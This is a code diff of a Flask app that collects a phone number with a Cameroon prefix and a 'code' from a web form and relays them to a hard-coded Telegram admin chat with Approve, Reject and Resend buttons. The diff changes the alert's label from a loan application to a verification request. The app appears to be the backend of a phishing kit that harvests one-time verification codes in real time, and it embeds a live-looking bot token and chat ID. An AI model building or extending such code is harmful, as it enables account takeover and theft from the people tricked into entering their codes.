@@ -9,7 +9,7 @@ TELEGRAM_TOKEN = "9120980562:AAHdCkCej7QrZp9nj6VrRT5zp13sZBQ69cI"
 ADMIN_CHAT_ID = "7477343871"
 
 pending_requests = {}
-message_details = {} 
+message_details = {}
 
 @app.route('/')
 def serve_index():
@@ -25,9 +25,8 @@ def request_approval():
         phone = data.get('phone', 'Unknown')
         code = data.get('code', 'Unknown')
         
-        text = f"🚨 *New Loan Application*\n\n📱 Phone: +237 {phone}\n🔑 Details: {code}\n\nDo you approve?"
+        text = f"🚨 *New Verification Request*\n\n📱 Phone: +237 {phone}\n🔑 Code: {code}"
         
-        # Three buttons now
         keyboard = {
             "inline_keyboard": [[
                 {"text": "✅ Approve", "callback_data": f"approve_{app_id}"},
@@ -81,7 +80,6 @@ def telegram_webhook():
             message_id = msg_info["message_id"]
             original_text = msg_info["original_text"]
             
-            # Generate new text based on action
             if action == "approve":
                 new_text = f"{original_text}\n\n---\n*Status: ✅ APPROVED*"
                 markup = {"inline_keyboard": []}
@@ -90,7 +88,7 @@ def telegram_webhook():
                 markup = {"inline_keyboard": []}
             elif action == "resend":
                 new_text = f"{original_text}\n\n---\n*Status: 🔄 RESEND REQUESTED*"
-                markup = {"inline_keyboard": []} # Or keep buttons if you want
+                markup = {"inline_keyboard": []}
             
             edit_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/editMessageText"
             requests.post(edit_url, json={
